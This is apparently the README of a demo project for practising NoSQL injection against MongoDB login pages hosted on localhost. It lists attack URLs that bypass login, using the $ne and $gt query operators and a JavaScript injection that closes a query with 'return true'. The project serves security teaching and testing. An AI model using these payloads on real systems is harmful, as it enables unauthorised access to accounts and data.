# NoSQLInjectionAttackDemo
NoSQLInjectionAttackDemo is website demo for test NoSQL Injection. There are two website demos in this project and all databases are mongoDB
# Requirements
Install web server for example nginx, apache on local computer. On a Debian, Red Hat based system or windows are ok.
# Building
demo   : http://localhost/github/NoSQLInjectionAttackDemo/demo.html

demo_1 : http://localhost/github/NoSQLInjectionAttackDemo/demo_1.html
# Usage
Open url in the browser: http://localhost/github/NoSQLInjectionAttackDemo/demo.html
![image](https://github.com/youngyangyang04/NoSQLInjectionAttackDemo/blob/master/images/demo.png)
Attack URL for demo:
* http://localhost/github/NoSQLInjectionAttackDemo/login/detected_login.php?username[$ne]=2&password[$ne]=r
* http://localhost/github/NoSQLInjectionAttackDemo/login/detected_login.php?username[$gt]=&password[$gt]=

Attack URL for demo_1:
* http://localhost/github/NoSQLInjectionAttackDemo/login/login_1.php?username=1&password=2;return true;}//
